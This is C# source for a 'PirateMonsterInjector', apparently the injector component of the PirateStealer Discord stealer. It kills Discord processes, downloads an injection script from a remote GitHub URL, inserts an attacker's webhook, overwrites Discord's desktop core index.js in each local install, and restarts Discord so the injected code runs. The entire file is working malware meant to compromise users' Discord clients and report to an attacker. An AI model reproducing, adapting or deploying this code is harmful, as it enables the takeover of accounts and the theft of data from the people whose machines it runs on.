using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace PirateMonsterInjector
{
    class Program
    {
        static List<string> GetDiscords()
        {
            List<string> discords = new List<string>();
            foreach (var item in Directory.GetDirectories(Environment.GetEnvironmentVariable("LocalAppData")))
            {
                if (item.Contains("cord"))
                {
                    
                    discords.Add(item);
                }

            }
            return discords;
        }
        
        static string GetIndex(string direct)
        {
            string path = "";
            try
            {
                //do not ask why i call this variable like this i made an edit and i was too lazy for rename other things
                string localappdata = direct;
                foreach (var dir1 in Directory.GetDirectories(localappdata))
                {
                    if (dir1.Contains("app-"))
                    {

                        foreach (var app in Directory.GetDirectories(dir1))
                        {
                            if (app.Contains("modules"))
                            {
                                foreach (var item in Directory.GetDirectories(app))
                                {
                                    if (item.Contains("discord_desktop_core"))
                                    {
                                        Directory.CreateDirectory(item + @"\discord_desktop_core\PirateStealerBTW");
                                        path = item + @"\discord_desktop_core\index.js";
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception)
            {

                path = "Discord Not Found";
            }
            return path;
        }

        static void DiscordProcesses()
        {
            List<string> discordproc = new List<string>();
            foreach (var item in Process.GetProcesses())
            {
                if (item.ProcessName.Contains("iscord"))
                {
                    item.Kill();
                }
            }


        }
        static void Main(string[] args)
        {
            DiscordProcesses();
            WebClient client = new WebClient();
            string script = client.DownloadString("https://raw.githubusercontent.com/Stanley-GF/PirateStealer/main/src/Injection/injection");
            foreach (var item in GetDiscords())
            {
                try
                {
                    File.WriteAllText(GetIndex(item), script.Replace("%WEBHOOK_LINK%", Settings.Webhook));
                    
                }
                catch (Exception)
                {


                }
            }
            foreach (var item in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Discord Inc"))
            {
                Process.Start(item);
            }
        }
    }
}
